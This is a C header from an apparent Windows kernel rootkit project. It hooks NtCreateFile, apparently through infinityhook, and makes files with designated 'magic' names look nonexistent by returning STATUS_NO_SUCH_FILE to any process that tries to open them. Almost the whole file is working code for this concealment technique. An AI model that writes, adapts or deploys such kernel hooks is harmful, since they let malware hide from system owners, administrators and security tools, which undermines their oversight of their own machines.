#pragma once
#include "Settings.h"

typedef NTSTATUS(*NtCreateFile_t)(
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_opt_ PLARGE_INTEGER AllocationSize,
	_In_ ULONG FileAttributes,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
	_In_ ULONG EaLength
	);

static UNICODE_STRING StringNtCreateFile = RTL_CONSTANT_STRING(L"NtCreateFile");
static NtCreateFile_t OriginalNtCreateFile = NULL;

/*
*	This function is invoked instead of nt!NtCreateFile. It will
*	attempt to filter a file by the "magic" file name.
*/
NTSTATUS DetourNtCreateFile(
	_Out_ PHANDLE FileHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_Out_ PIO_STATUS_BLOCK IoStatusBlock,
	_In_opt_ PLARGE_INTEGER AllocationSize,
	_In_ ULONG FileAttributes,
	_In_ ULONG ShareAccess,
	_In_ ULONG CreateDisposition,
	_In_ ULONG CreateOptions,
	_In_reads_bytes_opt_(EaLength) PVOID EaBuffer,
	_In_ ULONG EaLength)
{
	//
	// We're going to filter for our "magic" file name.
	//
	if (ObjectAttributes &&
		ObjectAttributes->ObjectName &&
		ObjectAttributes->ObjectName->Buffer)
	{
		//
		// Unicode strings aren't guaranteed to be NULL terminated so
		// we allocate a copy that is.
		//
		PWCHAR ObjectName = (PWCHAR)ExAllocatePool(NonPagedPool, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));

		if (ObjectName)
		{
			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);

			//
			// Does it contain our special file name?
			//
			if (matchMagicNames(ObjectName, (Target)TARGET_FILE))
			{
				kprintf("[+] infinityhook: Denying direct open access to file: %wZ.\n", ObjectAttributes->ObjectName);

				ExFreePool(ObjectName);

				return STATUS_NO_SUCH_FILE;
			}

			ExFreePool(ObjectName);
		}
	}

	// we don't hide this file, return the original call
	return OriginalNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
}